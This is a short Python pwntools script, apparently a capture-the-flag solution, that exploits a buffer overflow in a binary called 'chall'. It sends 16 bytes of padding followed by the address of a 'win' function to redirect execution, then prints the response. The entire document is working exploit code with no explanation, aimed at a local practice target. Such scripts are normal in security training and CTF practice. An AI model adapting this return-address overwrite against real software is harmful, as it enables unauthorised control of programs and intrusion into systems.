from pwn import * 

p = process("chall")
p = remote("localhost",3000)
elf = ELF("chall")
win = elf.sym["win"]
payload=b"a"*16 + p64(win)
p.sendlineafter(b"I heard that you can control the future.Prove it to me !\n>",payload)
p.recvline()
p.recvline()
print(p.recvline().decode())
